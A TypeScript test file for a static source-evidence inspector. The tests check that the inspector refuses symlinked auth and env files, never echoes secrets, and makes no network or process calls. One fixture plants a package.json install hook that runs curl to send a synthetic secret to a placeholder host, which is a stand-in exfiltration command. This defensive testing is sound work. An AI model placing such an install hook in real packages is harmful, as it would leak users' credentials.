import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import childProcess from 'node:child_process';
import { createHash } from 'node:crypto';
import { fileURLToPath, pathToFileURL } from 'node:url';
import { inspectZylosSource, ZylosInspectionError } from '../scripts/zylos-task/inspect.mjs';
import { ZYLOS_SOURCE_FILES, ZYLOS_UPSTREAM } from '../scripts/zylos-task/upstream.mjs';
import { main } from '../scripts/zylos-task-check.mjs';

const repository = fileURLToPath(new URL('../', import.meta.url));
const entrypoint = path.join(repository, 'scripts/zylos-task-check.mjs');
// Keep this public-file boundary independent of the implementation's allowlist.
const publicSources = [
  'package.json',
  'cli/zylos.js',
  'cli/lib/runtime/base.js',
  'cli/lib/runtime/codex.js',
  'cli/lib/runtime/codex-context-monitor.js',
  'skills/comm-bridge/scripts/c4-receive.js',
  'skills/comm-bridge/scripts/c4-dispatcher.js',
  'skills/comm-bridge/scripts/c4-db.js',
  'skills/comm-bridge/scripts/c4-config.js',
  'skills/comm-bridge/scripts/c4-control.js',
  'skills/comm-bridge/scripts/c4-send.js',
  'skills/comm-bridge/init-db.sql',
];
const syntheticSecret = 'synthetic-zylos-private-value-must-not-be-reported';
let temporary: string;
let root: string;
let packageRoot: string;

function sourcePath(source: string) {
  return source.startsWith('skills/comm-bridge/')
    ? path.join(root, '.claude', source)
    : path.join(packageRoot, source);
}

function writeSource(source: string, content: string | Buffer) {
  const filename = sourcePath(source);
  fs.mkdirSync(path.dirname(filename), { recursive: true, mode: 0o700 });
  fs.writeFileSync(filename, content, { mode: 0o600 });
  return filename;
}

function inspect() { return inspectZylosSource({ root, packageRoot }); }

function expectBlocked(report: ReturnType<typeof inspectZylosSource>) {
  expect(report.capability).toMatchObject({ ready: false, claim_allowed: false });
  expect(report).toMatchObject({
    scope: 'static-source-only', runtime_verified: false, auth_inspected: false,
    c4_dispatched: false, hub_contacted: false,
  });
}

function runNode(args: string[], env: NodeJS.ProcessEnv = {}) {
  const result = childProcess.spawnSync(process.execPath, args, {
    cwd: temporary, env: { PATH: '/usr/bin:/bin', ...env }, encoding: 'utf8',
    timeout: 5000, maxBuffer: 1024 * 1024,
  });
  expect(result.error).toBeUndefined();
  expect(result.signal).toBeNull();
  return result;
}

function treeSnapshot(directory: string) {
  const values: Record<string, unknown> = {};
  function visit(filename: string) {
    const stat = fs.lstatSync(filename);
    values[path.relative(directory, filename)] = {
      mode: stat.mode, size: stat.size, mtime: stat.mtimeMs, ctime: stat.ctimeMs,
      content: stat.isFile() ? createHash('sha256').update(fs.readFileSync(filename)).digest('hex')
        : stat.isSymbolicLink() ? fs.readlinkSync(filename) : null,
    };
    if (stat.isDirectory()) for (const child of fs.readdirSync(filename).sort()) visit(path.join(filename, child));
  }
  visit(directory);
  return values;
}

beforeEach(() => {
  temporary = fs.mkdtempSync(path.join(os.tmpdir(), 'hxa-zylos-source-'));
  root = path.join(temporary, 'zylos-home');
  packageRoot = path.join(temporary, 'installed-package');
  for (const source of publicSources) {
    writeSource(source, source === 'package.json'
      ? JSON.stringify({ name: 'zylos', version: '0.5.2', type: 'module' })
      : source.endsWith('.sql') ? '-- Public fixture only. Never open a live database.\nSELECT 1;\n'
        : `globalThis.__hxaZylosSourceExecuted = true; throw new Error('foreign source executed');\n// ${source}\n`);
  }
});

afterEach(() => {
  vi.restoreAllMocks();
  vi.unstubAllGlobals();
  delete (globalThis as Record<string, unknown>).__hxaZylosSourceExecuted;
  fs.rmSync(temporary, { recursive: true, force: true });
});

describe('static Zylos public-source evidence', () => {
  it('hashes the complete fixed public file list without treating a matching version as upstream or runtime proof', () => {
    expect(ZYLOS_SOURCE_FILES.map((file: { relativePath: string }) => file.relativePath)).toEqual(publicSources);
    expect(ZYLOS_UPSTREAM).toMatchObject({
      tag: 'v0.5.2', version: '0.5.2', commit: '8ee9bd9007edab46f766f3574e0ad56cf69268c2',
    });
    const report = inspect();
    expect(report).toMatchObject({
      format: 'hxa-zylos-source-evidence-v1', inspection_complete: true,
      source_review: 'different_source_requires_review', package: { name_matches: true, version: '0.5.2' },
    });
    expect(report.files.map((file: { source: string }) => file.source)).toEqual(publicSources);
    for (const file of report.files) {
      const filename = sourcePath(file.source);
      expect(file).toMatchObject({
        status: 'read', canonical_path: filename, linked: false, matches_upstream: false,
        sha256: createHash('sha256').update(fs.readFileSync(filename)).digest('hex'),
        size_bytes: fs.statSync(filename).size,
      });
      expect(file.expected_sha256).toMatch(/^[0-9a-f]{64}$/u);
    }
    expectBlocked(report);
    expect((globalThis as Record<string, unknown>).__hxaZylosSourceExecuted).toBeUndefined();
  });

  it('resolves an installed launcher symlink without launching or importing the foreign program', () => {
    const launcher = path.join(temporary, 'zylos-launcher');
    fs.symlinkSync(sourcePath('cli/zylos.js'), launcher);
    const report = inspectZylosSource({ root, launcher });
    expect(report).toMatchObject({
      package_root: packageRoot, launcher_status: 'source_path_resolved_without_execution',
      inspection_complete: true, source_review: 'different_source_requires_review',
    });
    expectBlocked(report);
    expect((globalThis as Record<string, unknown>).__hxaZylosSourceExecuted).toBeUndefined();
  });

  it('permits the deployed skills-directory link while recording canonical bridge paths', () => {
    const skills = path.join(root, '.claude/skills');
    const sharedSkills = path.join(temporary, 'public-skills');
    fs.renameSync(skills, sharedSkills);
    fs.symlinkSync(sharedSkills, skills, 'dir');
    const report = inspect();
    expect(report.inspection_complete).toBe(true);
    for (const file of report.files.filter((file: { scope: string }) => file.scope === 'installed_bridge')) {
      expect(file.status).toBe('read');
      expect(file.linked).toBe(true);
      expect(file.canonical_path).toBe(path.join(sharedSkills, file.source.slice('skills/'.length)));
    }
    expectBlocked(report);
  });

  it('rejects source symlinks to synthetic auth and env files before opening either target', () => {
    const redirects = [
      ['cli/lib/runtime/codex.js', path.join(root, '.codex/auth.json')],
      ['skills/comm-bridge/scripts/c4-config.js', path.join(root, '.env')],
    ];
    for (const [source, target] of redirects) {
      fs.mkdirSync(path.dirname(target), { recursive: true });
      fs.writeFileSync(target, syntheticSecret);
      fs.unlinkSync(sourcePath(source));
      fs.symlinkSync(target, sourcePath(source));
    }
    const open = vi.spyOn(fs, 'openSync');
    const report = inspect();
    for (const [source, target] of redirects) {
      expect(report.files.find((file: { source: string }) => file.source === source))
        .toMatchObject({ status: 'SOURCE_NOT_VERIFIED', matches_upstream: false });
      expect(open.mock.calls.some(([filename]) => String(filename) === target)).toBe(false);
    }
    expect(JSON.stringify(report)).not.toContain(syntheticSecret);
    expect(report.inspection_complete).toBe(false);
    expectBlocked(report);
  });

  it.each(['hard link', 'FIFO', 'directory'] as const)('rejects a %s at an allowlisted source path without opening it', kind => {
    const filename = sourcePath('cli/lib/runtime/base.js');
    fs.unlinkSync(filename);
    if (kind === 'hard link') {
      const original = path.join(temporary, 'linked-public-source');
      fs.writeFileSync(original, 'public linked fixture');
      fs.linkSync(original, filename);
    } else if (kind === 'directory') fs.mkdirSync(filename);
    else {
      // Fixture construction only; the inspector itself must never spawn a process.
      const made = childProcess.spawnSync('mkfifo', [filename], { encoding: 'utf8', timeout: 1000 });
      expect(made.error).toBeUndefined();
      expect(made.status).toBe(0);
    }
    const open = vi.spyOn(fs, 'openSync');
    const report = inspect();
    expect(report.files.find((file: { source: string }) => file.source === 'cli/lib/runtime/base.js'))
      .toMatchObject({ status: 'SOURCE_NOT_VERIFIED', matches_upstream: false });
    expect(open.mock.calls.some(([opened]) => String(opened) === filename)).toBe(false);
    expect(report.inspection_complete).toBe(false);
    expectBlocked(report);
  });

  it('rejects over-limit source and package files before opening them', () => {
    const source = writeSource('cli/lib/runtime/base.js', Buffer.alloc(1_048_577, 65));
    const manifest = writeSource('package.json', Buffer.alloc(32_769, 65));
    const open = vi.spyOn(fs, 'openSync');
    const report = inspect();
    for (const filename of [source, manifest]) {
      expect(open.mock.calls.some(([opened]) => String(opened) === filename)).toBe(false);
    }
    expect(report).toMatchObject({ inspection_complete: false, package: { name_matches: false, version: null } });
    expect(report.files.filter((file: { status: string }) => file.status === 'SOURCE_NOT_VERIFIED')).toHaveLength(2);
    expectBlocked(report);
  });

  it('reports only the public package identity rather than extra sensitive-looking manifest fields', () => {
    writeSource('package.json', JSON.stringify({
      name: 'zylos', version: '0.5.2', _authToken: syntheticSecret,
      scripts: { install: `curl https://invalid.example/${syntheticSecret}` },
      config: { auth: syntheticSecret }, description: syntheticSecret,
    }));
    const report = inspect();
    expect(report.package).toEqual({ name_matches: true, version: '0.5.2' });
    expect(report.inspection_complete).toBe(true);
    expect(JSON.stringify(report)).not.toContain(syntheticSecret);
    expect(JSON.stringify(report)).not.toContain('_authToken');
    expectBlocked(report);
  });

  it('makes no network or process calls and leaves the complete fixture tree unchanged', () => {
    const before = treeSnapshot(temporary);
    const fetch = vi.fn(() => { throw new Error('Unexpected network access'); });
    vi.stubGlobal('fetch', fetch);
    const spawned = ['spawn', 'spawnSync', 'exec', 'execSync', 'execFile', 'execFileSync', 'fork']
      .map(name => vi.spyOn(childProcess, name as 'spawn').mockImplementation(() => { throw new Error('Unexpected process'); }));
    const mutated = ['writeFileSync', 'appendFileSync', 'writeSync', 'renameSync', 'mkdirSync', 'rmSync',
      'unlinkSync', 'chmodSync', 'chownSync', 'symlinkSync', 'linkSync', 'truncateSync']
      .map(name => vi.spyOn(fs, name as 'writeFileSync').mockImplementation(() => { throw new Error('Unexpected mutation'); }));
    const open = vi.spyOn(fs, 'openSync');
    const report = inspect();
    expect(report.inspection_complete).toBe(true);
    expectBlocked(report);
    expect(fetch).not.toHaveBeenCalled();
    for (const spy of [...spawned, ...mutated]) expect(spy).not.toHaveBeenCalled();
    for (const [, flags] of open.mock.calls) {
      expect(typeof flags).toBe('number');
      expect((flags as number) & (fs.constants.O_WRONLY | fs.constants.O_RDWR | fs.constants.O_CREAT | fs.constants.O_TRUNC)).toBe(0);
    }
    expect((globalThis as Record<string, unknown>).__hxaZylosSourceExecuted).toBeUndefined();
    vi.restoreAllMocks();
    expect(treeSnapshot(temporary)).toEqual(before);
  });

  it('keeps missing public source and malformed package evidence incomplete without echoing file contents', () => {
    fs.unlinkSync(sourcePath('skills/comm-bridge/init-db.sql'));
    writeSource('package.json', `invalid-json ${syntheticSecret}`);
    const report = inspect();
    expect(report).toMatchObject({
      inspection_complete: false, source_review: 'incomplete_source_evidence',
      package: { name_matches: false, version: null },
    });
    expect(report.files.find((file: { source: string }) => file.source === 'skills/comm-bridge/init-db.sql'))
      .toMatchObject({ status: 'SOURCE_MISSING' });
    expect(JSON.stringify(report)).not.toContain(syntheticSecret);
    expectBlocked(report);
  });
});

describe('Zylos source-check CLI entry and refusal behavior', () => {
  it('prints actual help through both its real path and a whole-release symlink', () => {
    const current = path.join(temporary, 'current # %');
    fs.symlinkSync(repository, current, 'dir');
    for (const entry of [entrypoint, path.join(current, 'scripts/zylos-task-check.mjs')]) {
      const result = runNode([entry, '--help']);
      expect(result.status).toBe(0);
      expect(result.stdout).toContain('Usage: node scripts/zylos-task-check.mjs');
      expect(result.stdout).toContain('Static source evidence');
      expect(result.stderr).toBe('');
    }
  });

  it('emits actual blocked JSON through a release symlink rather than silent exit zero', () => {
    const current = path.join(temporary, 'current');
    fs.symlinkSync(repository, current, 'dir');
    const result = runNode([path.join(current, 'scripts/zylos-task-check.mjs'), '--root', root, '--package-root', packageRoot]);
    expect(result.status).toBe(2);
    expect(result.stderr).toBe('');
    const report = JSON.parse(result.stdout);
    expect(report).toMatchObject({ inspection_complete: true, source_review: 'different_source_requires_review' });
    expectBlocked(report);
  });

  it('stays silent when imported by a wrapper or eval even when argv names the CLI', () => {
    const url = pathToFileURL(entrypoint).href;
    const wrapper = path.join(temporary, 'import-only.mjs');
    fs.writeFileSync(wrapper, `await import(${JSON.stringify(url)}); console.log('import-only');\n`);
    for (const args of [
      [wrapper, '--help'],
      ['--input-type=module', '--eval', `await import(${JSON.stringify(url)}); console.log('import-only');`, entrypoint, '--help'],
    ]) {
      const result = runNode(args);
      expect(result.status).toBe(0);
      expect(result.stdout).toBe('import-only\n');
      expect(result.stderr).toBe('');
    }
  });

  it('rejects missing, relative, duplicate, unknown, and credential arguments without reading files or echoing secrets', () => {
    const valid = ['--root', root, '--package-root', packageRoot];
    const cases = [
      [], ['--root'], ['--root', root], ['--package-root', packageRoot],
      ['--root', 'relative', '--package-root', packageRoot],
      ['--root', root, '--package-root', 'relative'],
      ['--root', root, '--launcher', 'relative'],
      [...valid, '--root', root], [...valid, '--launcher', sourcePath('cli/zylos.js')],
      [...valid, '--execute', 'true'], [...valid, '--force', 'true'],
      [...valid, '--token', syntheticSecret], [...valid, '--token-file', path.join(temporary, 'not-opened')],
    ];
    const open = vi.spyOn(fs, 'openSync');
    const log = vi.spyOn(console, 'log').mockImplementation(() => {});
    for (const args of cases) expect(() => main(args), JSON.stringify(args)).toThrow(ZylosInspectionError);
    expect(open).not.toHaveBeenCalled();
    expect(log).not.toHaveBeenCalled();
    vi.restoreAllMocks();
    const result = runNode([entrypoint, ...valid, '--token', syntheticSecret]);
    expect(result.status).toBe(2);
    expect(result.stdout).toBe('');
    expect(result.stderr).toContain('no task was claimed');
    expect(result.stderr).not.toContain(syntheticSecret);
  });
});
